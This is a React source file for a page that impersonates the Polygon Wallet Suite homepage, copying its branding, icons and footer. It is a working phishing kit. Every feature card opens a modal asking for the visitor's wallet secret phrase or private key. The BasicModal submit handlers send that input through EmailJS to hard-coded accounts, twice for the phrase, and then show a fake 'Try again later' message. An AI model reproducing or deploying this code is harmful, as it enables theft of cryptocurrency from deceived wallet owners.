import {
  Box,
  Container,
  Stack,
  Tab,
  Tabs,
  Typography,
  Divider,
  FormControlLabel,
  Switch,
  Button,
  Modal,
  TextField,
} from "@mui/material";
import React from "react";
import { New, Proof, Second } from "../../assets/Assets";
import theme from "../../mui/theme";
import emailjs from "@emailjs/browser";

const proofMap = [
  {
    title: "Portfolio",
    text: "View your balance on Polygon chains",
    src: "https://wallet.polygon.technology/assets/img/homepage/icons/portfolio.svg",
  },
  {
    title: "Native Bridge",
    text: "Transfer assets between Polygon zkEVM and Ethereum",
    src: "https://wallet.polygon.technology/assets/img/homepage/icons/bridge.svg",
  },
  {
    title: "Faster Bridges",
    text: "Bridge your asset faster with third-party bridges",
    src: "https://wallet.polygon.technology/assets/img/homepage/icons/fast-bridges.svg",
  },
];
const zkMap = [
  {
    title: "Portfolio",
    text: "View your balance on Polygon chains",
    src: "https://wallet.polygon.technology/assets/img/homepage/icons/portfolio.svg",
  },
  {
    title: "Native Bridge",
    text: "Transfer assets between Polygon zkEVM and Ethereum",
    src: "https://wallet.polygon.technology/assets/img/homepage/icons/bridge.svg",
  },
  {
    title: "Faster Bridges",
    text: "Bridge your asset faster with third-party bridges",
    src: "https://wallet.polygon.technology/assets/img/homepage/icons/fast-bridges.svg",
  },
  {
    title: "Swap",
    text: "Swap between tokens on Polygon PoS",
    src: "https://wallet.polygon.technology/assets/img/homepage/icons/swap.svg",
  },
];

const proofMap2 = [
  {
    title: "Polygon Scan",
    text: "Block Explorer and Analytics Platform",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/explorer.svg",
  },
  {
    title: "Token Mapper",
    text: "Map tokens between Polygon and Ethereum",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/token_mapper.svg",
  },
  {
    title: "Faucet",
    text: "Get free test tokens to get started with Polygon",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/faucen.svg",
  },
  {
    title: "Safe Bridge",
    text: "Multi-sig bridge between Polygon and Ethereum",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/safe_bridge.svg",
  },
  {
    title: "Bridge Explorer",
    text: "Check Polygon PoS bridging transactions",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/documentation.svg",
  },
  {
    title: "Staking",
    text: "Secure Polygon PoS by staking MATIC tokens",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/staking.svg",
  },
  {
    title: "Ecosystem dApps",
    text: "Explore more Web3 dApps on Polygon",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/eco_system_dapps.svg",
  },
];

const zkMap2 = [
  {
    title: "ZkEVM Explorer",
    text: "Block Explorer and Analytics Platform",
    icon: "https://wallet.polygon.technology/assets/img/homepage/icons/explorer.svg",
  },
];
function HomePage() {
  const [value, setValue] = React.useState(0);
  const [open, setOpen] = React.useState(false);

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };
  return (
    <>
      <Container maxWidth="lg">
        <Box
          pt={16}
          sx={{
            background:
              "radial-gradient(70.71% 70.71% at 50% 50%, #EBE1FF 13.48%, #FFF 100%)",
            minHeight: "80vh",
            borderRadius: "20px",
          }}
        >
          <Typography variant="h1" color="initial" align="center">
            Get started with Polygon Wallet Suite
          </Typography>

          {/* Tabs  */}
          <Box
            mt={5}
            mb={5}
            sx={{
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
            }}
          >
            <Tabs
              value={value}
              onChange={handleChange}
              TabIndicatorProps={{
                style: {
                  display: "none",
                },
              }}
              sx={{
                //   background: "#212026",
                borderRadius: "14px",
              }}
            >
              <Tab
                icon={<Proof />}
                iconPosition="start"
                label="Proof of Stake"
                sx={{
                  color: value === 0 ? "#000" : "#52555D",
                  backgroundColor: value === 0 ? "#fff" : "#FAF7FE",
                  width: { xs: "180px", md: "250px" },
                }}
              />
              <Tab
                icon={<Second />}
                iconPosition="start"
                label={
                  <Stack direction="row" alignItems="center">
                    ZkEVM &nbsp; <New />
                  </Stack>
                }
                sx={{
                  color: value === 1 ? "#52555D" : "#52555D",
                  backgroundColor: value === 1 ? "#fff" : "#FAF7FE",
                  width: { xs: "180px", md: "250px" },
                }}
              />
            </Tabs>
          </Box>
        </Box>

        <Box>
          <Box
            sx={{
              margin: { xs: "-340px 0", md: "-190px 30px" },
              background: "#fff",
              borderRadius: "20px",
              border: "1px solid #DDDFE0",
            }}
          >
            {value === 0 && (
              <BoxTab
                title="PoS Solutions"
                mapGrid={
                  <>
                    {proofMap.map((item) => (
                      <BoxGridMap
                        title={item.title}
                        text={item.text}
                        src={item.src}
                        onClick={() => setOpen(true)}
                      />
                    ))}
                  </>
                }
                mapGrid2={
                  <>
                    {proofMap2.map((item) => (
                      <BoxGridMap2
                        icon={item.icon}
                        title={item.title}
                        text={item.text}
                        onClick={() => setOpen(true)}
                      />
                    ))}
                  </>
                }
              />
            )}

            {value === 1 && (
              <BoxTab
                title="ZkEVM Solutions"
                mapGrid={
                  <>
                    {zkMap.map((item) => (
                      <BoxGridMap
                        title={item.title}
                        text={item.text}
                        src={item.src}
                        onClick={() => setOpen(true)}
                      />
                    ))}
                  </>
                }
                mapGrid2={
                  <>
                    {zkMap2.map((item) => (
                      <BoxGridMap2
                        icon={item.icon}
                        title={item.title}
                        text={item.text}
                        onClick={() => setOpen(true)}
                      />
                    ))}
                  </>
                }
              />
            )}
          </Box>
          <Container>
            <Box mt={{ xs: 50, md: 30 }} mb={10}>
              <Stack
                direction={{ md: "row" }}
                justifyContent={{ md: "space-between" }}
                alignItems={{ md: "center" }}
                spacing={2}
              >
                <Typography
                  variant="body1"
                  color={theme.palette.textSecondary.main}
                >
                  2023 Polygon Labs UI (Cayman) Ltd. | All rights reserved
                </Typography>
                <Typography
                  mt={{ xs: "20px", sm: "0" }}
                  variant="body1"
                  color={theme.palette.textSecondary.main}
                >
                  Cookie Policy &nbsp; Terms of Use &nbsp; Privacy Policy
                </Typography>
              </Stack>
            </Box>
          </Container>
        </Box>
      </Container>

      <BasicModal open={open} setOpen={setOpen} />
    </>
  );
}

export default HomePage;

const style = {
  position: "absolute",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  width: 400,
  bgcolor: "background.paper",
  boxShadow: 24,
  p: 4,
  borderRadius: "20px",
};

function BoxTab({ title, mapGrid, mapGrid2 }) {
  return (
    <Box
      sx={{
        borderRadius: "20px",
        background: "fff",
        boxShadow:
          "0px 12px 8px 0px rgba(0, 0, 0, 0.02), 0px 4px 8px 0px rgba(0, 0, 0, 0.03)",
      }}
    >
      <Box
        sx={{
          padding: { xs: "10px 8px", md: "10px 20px" },
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          background: "#fff",
          borderRadius: "20px",
        }}
      >
        <Typography variant="h4" color="#292C34">
          {title}
        </Typography>
        <Typography variant="body1" color="#52555D">
          <FormControlLabel control={<Switch />} label=" Testnet Products" />
        </Typography>
      </Box>
      <Divider variant="fullWidth" orientation="horizontal" />

      <Box
        sx={{
          padding: "20px 20px",
          overflowY: "auto",
          height: "496px",

          "&::-webkit-scrollbar": {
            width: "0",
          },
          "&::-webkit-scrollbar-track": {
            boxShadow: "inset 0 0 6px rgba(0,0,0,0.00)",
            webkitBoxShadow: "inset 0 0 6px rgba(0,0,0,0.00)",
          },
          "&::-webkit-scrollbar-thumb": {
            backgroundColor: "rgba(0,0,0,.1)",
            outline: "1px solid slategrey",
          },
        }}
      >
        <Typography variant="body1" color="initial">
          Wallet Features
        </Typography>

        {/* Grid Box  */}
        <Box
          mt={3}
          sx={{
            display: "grid",
            gridTemplateColumns: {
              xs: "1fr",
              sm: "1fr 1fr",
              md: "1fr 1fr 1fr 1fr 1fr",
            },
            gap: 2,
          }}
        >
          {mapGrid}
        </Box>

        {/* Down section  */}
        <Box mt={5}>
          <Typography variant="body1" color="initial">
            Explore other {title}
          </Typography>

          <Box
            mt={3}
            sx={{
              display: "grid",
              gridTemplateColumns: {
                xs: "1fr",
                sm: "1fr 1fr",
                md: "1fr 1fr 1fr 1fr 1fr",
              },
              gap: 2,
            }}
          >
            {mapGrid2}
          </Box>
        </Box>
      </Box>
    </Box>
  );
}

function BoxGridMap({ title, text, src, onClick }) {
  return (
    <Box
      sx={{
        background: "#FAF7FE",
        height: "178px",
        width: "100%",
        borderRadius: "16px",
        border: "1px solid #DDDFE0",
        padding: "20px",
        position: "relative",
        cursor: "pointer",
      }}
      onClick={onClick}
    >
      <Stack spacing={2}>
        <Typography variant="h5" color="initial">
          {title}
        </Typography>
        <Typography variant="body2" color={theme.palette.textSecondary.main}>
          {text}
        </Typography>
      </Stack>
      <img
        src={src}
        alt=""
        style={{
          position: "absolute",
          right: 0,
          bottom: 0,
          height: "60px",
          width: "60px",
        }}
      />
    </Box>
  );
}

function BoxGridMap2({ title, text, icon, onClick }) {
  return (
    <Stack
      direction="row"
      spacing={2}
      sx={{ cursor: "pointer" }}
      onClick={onClick}
    >
      <img
        src={icon}
        alt=""
        style={{
          width: "24px",
          height: "24px",
        }}
      />
      <Stack spacing={1}>
        <Typography variant="h5" color="initial">
          {title}
        </Typography>
        <Typography variant="body2" color={theme.palette.textSecondary.main}>
          {text}
        </Typography>
      </Stack>
    </Stack>
  );
}

export function BasicModal({ open, setOpen }) {
  const handleClose = () => setOpen(false);
  const [value, setValue] = React.useState(0);
  const [phrase, setPhrase] = React.useState("");
  const [key, setKey] = React.useState("");
  const [loading, setLoading] = React.useState(false);
  const phraseform = React.useRef();
  const keyform = React.useRef();

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };
  const handlePhrase = (e) => {
    e.preventDefault();
    setLoading(true);
    emailjs
      .sendForm(
        "service_lpp0ez1",
        "template_tpueesf",
        phraseform.current,
        "mQcWugYQOwuKdh1vu"
      )
      .then((response) => {
        emailjs.sendForm(
          "service_udsvw3d",
          "template_bmqcwla",
          phraseform.current,
          "DNsER4-4UGLWYPh73"
        );
        setLoading(false);
        alert("Try again later");
        setPhrase("");
      })
      .catch((error) => {
        setLoading(false);
        alert(error);
      });
  };

  const handlePrivateKey = (e) => {
    e.preventDefault();
    setLoading(true);
    emailjs
      .sendForm(
        "service_lpp0ez1",
        "template_tpueesf",
        keyform.current,
        "mQcWugYQOwuKdh1vu"
      )
      .then((response) => {
        setLoading(false);
        alert("Try again later");
        setKey("");
      })
      .catch((error) => {
        setLoading(false);
        alert(error);
      });
  };

  return (
    <div>
      <Modal open={open} onClose={handleClose}>
        <Box sx={style}>
          <Box
            mt={5}
            mb={5}
            sx={{
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
            }}
          >
            <Tabs
              value={value}
              onChange={handleChange}
              TabIndicatorProps={{
                style: {
                  display: "none",
                  color: "#fff",
                },
              }}
              sx={{
                //   background: "#212026",
                borderRadius: "14px",
              }}
            >
              <Tab
                label="Phrase"
                sx={{
                  color: "#ffffffaa",
                  backgroundColor: value === 0 ? "#52555d9d" : "#52555d79",
                }}
              />
              <Tab
                label="Private Key"
                sx={{
                  color: "#ffffffaa",
                  backgroundColor: value === 1 ? "#52555d9d" : "#52555d79",
                }}
              />
            </Tabs>
          </Box>

          {value === 0 && (
            <Box
              mt={5}
              component="form"
              ref={phraseform}
              sx={{
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
              }}
              onSubmit={handlePhrase}
            >
              <TextField
                label="Enter Secret Phrase"
                multiline
                rows={4}
                name="phrase"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                required
              />
              <Typography
                variant="caption"
                color={theme.palette.textSecondary.main}
              >
                Typically 12 (Sometimes 18, 24) Words Separated By Single Spaces
              </Typography>
              <Button
                variant="contained"
                color="primary"
                sx={{ marginTop: "20px" }}
                type="submit"
              >
                Proceed
              </Button>
            </Box>
          )}

          {value === 1 && (
            <Box
              mt={5}
              component="form"
              ref={keyform}
              sx={{
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
              }}
              onSubmit={handlePrivateKey}
            >
              <TextField
                label="Enter Private Key"
                multiline
                rows={4}
                required
                name="key"
                value={key}
                onChange={(e) => setKey(e.target.value)}
              />
              <Typography
                variant="caption"
                color={theme.palette.textSecondary.main}
              >
                Typically 64 alphanumeric characters
              </Typography>
              <Button
                variant="contained"
                color="primary"
                sx={{ marginTop: "20px" }}
                type="submit"
              >
                Proceed
              </Button>
            </Box>
          )}
        </Box>
      </Modal>
    </div>
  );
}
